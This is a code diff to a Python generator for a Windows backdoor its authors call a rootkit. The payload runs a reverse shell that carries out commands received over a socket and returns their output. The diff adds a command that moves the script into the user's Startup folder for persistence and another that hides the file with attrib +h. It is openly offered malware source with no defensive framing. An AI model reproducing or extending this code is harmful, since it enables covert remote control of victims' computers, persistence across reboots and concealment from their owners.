@@ -166,6 +166,7 @@ import time
 import os 
 from ftplib import FTP
 import pyautogui
+from getpass import getuser
 
 time.sleep(3)
 
@@ -257,8 +258,8 @@ def reverseShell():
 
 
                 # Make File Command
-                elif command.lower().startswith('mkfile '):
-                    cut = 'mkfile '
+                elif command.lower().startswith('mkf '):
+                    cut = 'mkf '
                     makeFileName = command.replace(cut,'')
                     newCommand = f'type nul > {makeFileName}'
                     os.popen(newCommand)
@@ -333,6 +334,23 @@ def reverseShell():
                 #--------------------------------
 
 
+                # Startup Command
+                elif command.lower() == 'add startup':
+                    user = getuser()
+                    startupPath = f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+                    copyStartup = f'move /Y "{__file__}" "{startupPath}"'
+                    print(copyStartup)
+                    os.popen(copyStartup)
+                    result = '[?] Successfully Added To Startup'
+                    s.send(result.encode())
+                #--------------------------------
+
+                # Make Hidden Command
+                elif command.lower() == 'hide rootkit':
+                    os.system(f'attrib +h "{__file__}"')
+                    result = '[?] Successfully Hided Rootkit'
+                    s.send(result.encode())
+
                 
                 else:
                     output = os.popen(command).read()
@@ -345,7 +363,6 @@ def reverseShell():
             pass
 
 reverseShell()
-
 
 """
                     file.write(rootkit)
